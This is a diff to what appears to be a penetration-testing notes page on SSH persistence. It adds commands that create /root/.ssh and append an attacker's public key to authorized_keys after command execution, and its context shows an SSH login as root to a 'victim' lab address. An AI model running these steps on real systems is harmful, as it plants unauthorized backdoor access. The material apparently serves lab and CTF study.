@@ -550,6 +550,15 @@ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9H
                    <p>Connect to the victims using private key</p> 
                    <pre><code class="language-bash">ssh -i persist root@10.10.10.187</code></pre> 
                    
+                   <h2>Creation of .SSH folder</h2>
+                   <ul>
+                    <p>If you gained a command execution but you are not able to stablish a reverse shell connection due connectivity constraints we can create <b>.ssh</b> folder and <b>authorized_keys</b> file and persist using our public key</p>
+                    <pre><code class="language-bash">mkdir -p /root/.ssh
+chmod 700 /root/.ssh
+echo "ssh-ed25519 AAAA... usuario@host" >> /root/.ssh/authorized_keys  #Public key file
+chmod 600 /root/.ssh/authorized_keys</code></pre> 
+                   </ul>     
+
                    <h2>Checking owner of ssh key</h2>
                    <ul>
                     <p>Using the following command we will be able to check the ownership of an ssh key. Sometimes will give us a clue of what user can use that key</p>
